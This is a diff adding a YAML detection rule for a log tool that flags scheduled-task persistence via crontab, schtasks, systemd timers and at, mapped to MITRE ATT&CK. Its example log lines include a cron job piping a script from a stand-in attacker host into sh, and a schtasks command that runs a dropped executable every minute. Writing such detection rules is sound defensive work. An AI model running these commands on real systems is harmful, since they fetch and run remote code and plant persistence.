@@ -1,0 +1,35 @@
+id: builtin-cron-persist
+name: 定时任务持久化
+description: 检测 crontab、/etc/cron、schtasks、systemd timer 与 at 等持久化操作
+version: "1.0"
+author: GLog Team
+severity: medium
+enabled: true
+tags:
+  - persistence
+  - scheduled_task
+  - cron
+mitre_attack:
+  tactics:
+    - Persistence
+    - Execution
+  techniques:
+    - T1053.003
+    - T1053.005
+detection:
+  filter:
+    - field: message
+      op: regex
+      value: '(?i)(crontab|/etc/cron|schtasks|systemd.*timer|at\s+\d)'
+  condition: count > 0
+actions:
+  tags:
+    - persistence
+    - scheduled_task
+  risk_score: 65
+  alert:
+    title: 检测到定时任务持久化行为
+    message: 日志中出现 cron、schtasks 或 systemd timer 相关操作
+examples:
+  - "CRON[1234]: (root) CMD (/usr/bin/curl http://evil.example/x.sh | sh)"
+  - "schtasks /create /tn Updater /tr C:\\Users\\Public\\update.exe /sc minute"
